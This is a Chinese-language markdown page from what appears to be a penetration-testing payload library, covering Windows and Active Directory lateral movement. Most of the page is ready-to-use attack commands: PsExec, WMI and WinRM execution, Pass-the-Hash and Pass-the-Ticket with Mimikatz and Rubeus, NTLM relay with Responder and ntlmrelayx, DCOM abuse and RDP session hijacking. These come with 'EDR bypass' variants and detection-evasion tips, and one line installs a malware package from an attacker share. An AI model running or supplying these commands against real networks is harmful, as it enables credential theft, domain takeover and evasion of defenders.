# 内网/后渗透 — 横向移动 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ SRC 场景下大多受限,见 [../compliance.md](../compliance.md)
> 涵盖:SMB / WMI / PsExec / RDP / WinRM / Pass-the-Hash / Pass-the-Ticket / Overpass-the-Hash

---

### PsExec横向移动  `lateral-psexec`
使用PsExec进行横向移动
子类：**SMB** · tags: `psexec` `lateral` `smb` `windows`

**前置条件：** 目标机器开放445端口；拥有目标机器管理员凭证；ADMIN$共享可访问

**攻击链：**

**1. 基本使用**  _[linux]_
_使用Impacket的psexec.py连接目标_
```
psexec.py domain/user:password@target_ip
```

**2. 使用哈希连接**  _[linux]_
_使用NTLM哈希进行Pass-the-Hash_
```
psexec.py -hashes :NTLM_HASH domain/user@target_ip
```

**3. 执行命令**  _[linux]_
_在目标机器执行命令_
```
psexec.py domain/user:password@target_ip "whoami"
```

**4. Windows PsExec**  _[windows]_
_使用Sysinternals PsExec_
```
PsExec.exe \\target_ip -u domain\user -p password cmd.exe
```

**EDR 绕过变体：**

**1. 自定义服务名**
_使用自定义服务名避免检测_
```
psexec.py -service-name CustomService domain/user:password@target_ip
```

**2. SMBExec替代**
_使用smbexec.py，不写入磁盘_
```
smbexec.py domain/user:password@target_ip
```

**分析：** PsExec通过SMB协议在目标机器创建服务并执行命令，成功后可获得目标机器的Shell。

**OPSEC：** PsExec会在目标机器创建服务，容易被检测；服务名称和二进制文件可能触发告警；考虑使用更隐蔽的横向移动方式

---

### WMI横向移动  `lateral-wmi`
使用WMI进行横向移动
子类：**WMI** · tags: `wmi` `lateral` `windows` `remote`

**前置条件：** 目标机器开放135端口；拥有目标机器管理员凭证；WMI服务可访问

**攻击链：**

**1. WMI执行命令**  _[windows]_
_使用WMIC远程执行命令_
```
wmic /node:target_ip /user:domain\user /password:pass process call create "cmd.exe /c whoami"
```

**2. Impacket wmiexec**  _[linux]_
_使用Impacket的wmiexec.py_
```
wmiexec.py domain/user:password@target_ip
```

**3. 使用哈希**  _[linux]_
_Pass-the-Hash通过WMI_
```
wmiexec.py -hashes :NTLM_HASH domain/user@target_ip
```

**4. PowerShell WMI**  _[windows]_
_使用PowerShell WMI_
```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred
```

**EDR 绕过变体：**

**1. WMI事件订阅**
_通过WMI安装MSI包执行代码_
```
wmic /node:target_ip /user:domain\user /password:pass path win32_product call install /package:"\\attacker\share\malware.msi"
```

**分析：** WMI横向移动不会在目标机器创建服务，相对PsExec更隐蔽。

**OPSEC：** WMI执行不会留下明显的文件痕迹；但WMI活动可能被监控；命令输出通过临时文件获取

---

### Pass-the-Hash攻击  `pass-the-hash`
使用NTLM哈希进行身份验证
子类：**认证攻击** · tags: `pth` `ntlm` `hash` `authentication`

**前置条件：** 获取用户NTLM哈希；目标机器允许NTLM认证；目标机器开放SMB/WMI端口

**攻击链：**

**1. Impacket PtH**  _[linux]_
_使用Impacket进行PtH_
```
psexec.py -hashes :NTHASH domain/user@target_ip
```

**2. CrackMapExec PtH**  _[linux]_
_使用CrackMapExec进行PtH_
```
crackmapexec smb target_ip -u user -H NTHASH -d domain
```

**3. Windows PtH**  _[windows]_
_使用Mimikatz进行PtH_
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH
```

**4. PowerShell PtH**  _[windows]_
_使用PowerShell进行PtH_
```
Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip
```

**EDR 绕过变体：**

**1. Overpass-the-Hash**
_将哈希转换为Kerberos票据_
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH /run:cmd.exe
```

**分析：** PtH成功后可以该用户身份访问目标机器，无需明文密码。

**OPSEC：** PtH不会产生登录日志中的密码验证；但会留下网络登录日志；注意时间戳和来源IP

---

### NTLM Relay攻击  `ntlm-relay`
NTLM中继攻击技术
子类：**认证攻击** · tags: `ntlm` `relay` `smb` `authentication`

**前置条件：** 目标机器开放SMB端口；目标机器未启用SMB签名；可诱导目标机器认证

**攻击链：**

**1. Responder监听**  _[linux]_
_启动Responder监听NTLM认证_
```
responder -I eth0 -wrf
```

**2. ntlmrelayx攻击**  _[linux]_
_使用ntlmrelayx进行中继攻击_
```
ntlmrelayx.py -tf targets.txt -smb2support
```

**3. 中继到LDAP**  _[linux]_
_中继到LDAP进行权限提升_
```
ntlmrelayx.py -t ldap://dc_ip -smb2support --escalate-user user
```

**4. IPv6中继**  _[linux]_
_使用IPv6进行NTLM中继_
```
mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip
```

**EDR 绕过变体：**

**1. Drop the MIC**
_移除MIC标志绕过签名验证_
```
ntlmrelayx.py -t smb://target --remove-mic
```

**分析：** NTLM Relay成功后可以获取目标机器的访问权限或提升域权限。

**OPSEC：** 需要目标机器未启用SMB签名；域控制器默认启用签名；IPv6中继更隐蔽

---

### WinRM横向移动  `lateral-winrm`
通过WinRM进行横向移动
子类：**WinRM** · tags: `winrm` `lateral` `powershell`

**前置条件：** WinRM启用；有效凭证

**攻击链：**

**1. PowerShell远程**  _[windows]_
_PowerShell远程会话_
```
Enter-PSSession -ComputerName target -Credential $cred
```

**2. 执行命令**  _[windows]_
_远程执行命令_
```
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred
```

**3. evil-winrm**  _[linux]_
_使用evil-winrm连接_
```
evil-winrm -i target -u user -p password
```

---

### DCOM横向移动  `lateral-dcom`
通过DCOM进行横向移动
子类：**DCOM** · tags: `dcom` `lateral` `com`

**前置条件：** DCOM启用；有效凭证

**攻击链：**

**1. MMC20.Application**  _[windows]_
_通过MMC DCOM执行命令_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
```

**2. ShellBrowserWindow**  _[windows]_
_通过ShellBrowserWindow执行_
```
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami","c:\windows\system32",$null,0)
```

**3. Excel DCOM**  _[windows]_
_通过Excel DCOM执行_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd","/c calc.exe")
```

---

### SSH横向移动  `lateral-ssh`
通过SSH进行横向移动
子类：**SSH** · tags: `ssh` `lateral` `linux`

**前置条件：** SSH服务；有效凭证

**攻击链：**

**1. SSH连接**  _[linux]_
_基础SSH连接_
```
ssh user@target
```

**2. SSH密钥认证**  _[linux]_
_使用私钥连接_
```
ssh -i private_key user@target
```

**3. SSH跳板**  _[linux]_
_通过跳板机连接_
```
ssh -J jump_host user@target
```

---

### RDP会话劫持  `rdp-hijack`
劫持已存在的RDP会话
子类：**RDP** · tags: `rdp` `hijack` `session`

**前置条件：** SYSTEM权限；存在RDP会话

**攻击链：**

**1. 列出会话**  _[windows]_
_列出所有用户会话_
```
query user
```

**2. 劫持会话**  _[windows]_
_劫持指定会话_
```
tscon SESSION_ID /dest:console
```

**3. 使用Mimikatz**  _[windows]_
_使用Mimikatz劫持_
```
ts::sessions
ts::remote /id:SESSION_ID
```

---

### Overpass-the-Hash  `overpass-the-hash`
使用哈希获取Kerberos票据
子类：**PtH** · tags: `pth` `kerberos` `hash`

**前置条件：** 用户NTLM哈希；域环境

**攻击链：**

**1. Mimikatz**  _[windows]_
_使用哈希获取Kerberos票据_
```
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /ptt
```

**2. Rubeus**  _[windows]_
_使用Rubeus获取票据_
```
Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:HASH /ptt
```

**3. Impacket**  _[linux]_
_获取Kerberos票据_
```
getTGT.py domain.com/user -hashes :HASH
```

---

### Pass-the-Ticket  `pass-the-ticket`
使用Kerberos票据进行横向移动
子类：**PtT** · tags: `ptt` `kerberos` `ticket`

**前置条件：** 有效Kerberos票据

**攻击链：**

**1. 导出票据**  _[windows]_
_从内存导出Kerberos票据_
```
sekurlsa::tickets /export
```

**2. 注入票据**  _[windows]_
_注入票据到当前会话_
```
kerberos::ptt ticket.kirbi
```

**3. Rubeus导入**  _[windows]_
_使用Rubeus注入票据_
```
Rubeus.exe ptt /ticket:base64ticket
```

---

### SMBExec横向移动  `lateral-smbexec`
通过SMB执行命令
子类：**SMB** · tags: `smb` `lateral` `exec`

**前置条件：** SMB访问权限；管理员权限

**攻击链：**

**1. Impacket smbexec**  _[linux]_
_使用smbexec执行命令_
```
smbexec.py domain/user:password@target
```

**2. 通过服务执行**  _[windows]_
_创建并启动服务_
```
sc \\target create evilsvc binPath= "cmd /c whoami"
sc \\target start evilsvc
sc \\target delete evilsvc
```

---

### ATExec横向移动  `lateral-atexec`
通过计划任务执行命令
子类：**计划任务** · tags: `at` `scheduled` `lateral`

**前置条件：** 计划任务权限；管理员权限

**攻击链：**

**1. Impacket atexec**  _[linux]_
_使用atexec执行命令_
```
atexec.py domain/user:password@target "whoami"
```

**2. schtasks**  _[windows]_
_创建远程计划任务_
```
schtasks /create /s target /tn "evil" /tr "cmd /c whoami" /sc once /st 00:00
```

---

### WinRS横向移动  `lateral-winrs`
通过WinRS执行远程命令
子类：**WinRS** · tags: `winrs` `lateral` `windows`

**前置条件：** WinRM启用；有效凭证

**攻击链：**

**1. 执行命令**  _[windows]_
_远程执行命令_
```
winrs -r:target -u:user -p:password "whoami"
```

**2. 获取Shell**  _[windows]_
_获取远程CMD_
```
winrs -r:target -u:user -p:password "cmd"
```

---

### Excel DCOM横向移动  `lateral-dcom-excel`
利用Excel DCOM进行横向移动
子类：**DCOM** · tags: `dcom` `excel` `lateral`

**前置条件：** 目标安装Excel；DCOM权限

**攻击链：**

**1. Excel DCOM激活**  _[windows]_
_激活Excel DCOM对象_
```
$com = [Type]::GetTypeFromProgID("Excel.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Visible = $false
```

**2. 执行命令**  _[windows]_
_通过Excel执行命令_
```
$obj.Workbooks.Add()
$obj.Cells.Item(1,1) = "=CMD|/C calc.exe!A"
$obj.Run("calc.exe")
```

**3. Impacket DCOM**  _[linux]_
_使用Impacket执行_
```
python dcomexec.py -object Excel.Application domain/user:password@target.com
```

---

### MMC DCOM横向移动  `lateral-dcom-mmc`
利用MMC DCOM进行横向移动
子类：**DCOM** · tags: `dcom` `mmc` `lateral`

**前置条件：** 目标安装MMC；DCOM权限

**攻击链：**

**1. MMC20.Application**  _[windows]_
_使用MMC执行命令_
```
$com = [Type]::GetTypeFromProgID("MMC20.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```

**2. Impacket执行**  _[linux]_
_使用Impacket_
```
python dcomexec.py -object MMC20.Application domain/user:password@target.com
```

---

### RDP Relay攻击  `rdp-relay`
RDP中继攻击技术
子类：**RDP** · tags: `rdp` `relay` `lateral`

**前置条件：** RDP服务可访问；存在NTLM认证

**攻击链：**

**1. 设置中继**  _[linux]_
_设置RDP中继服务器_
```
使用Impacket:
python ntlmrelayx.py -tf targets.txt -smb2support
或使用rdp_relay.py
```

**2. 诱导连接**
_诱导用户连接_
```
诱导用户连接到攻击者控制的RDP服务器:
1. 发送恶意RDP文件
2. 用户连接时中继到目标
```

**3. PetitPotam组合**  _[linux]_
_PetitPotam + RDP Relay_
```
python petitpotam.py -d domain -u user -p pass attacker_ip target_ip
结合NTLM中继攻击ADCS
```

---



---

← 回 [00-index.md](00-index.md) · 上一篇:[`10-credentials.md`](10-credentials.md) · 下一篇:[`12-privesc.md`](12-privesc.md)
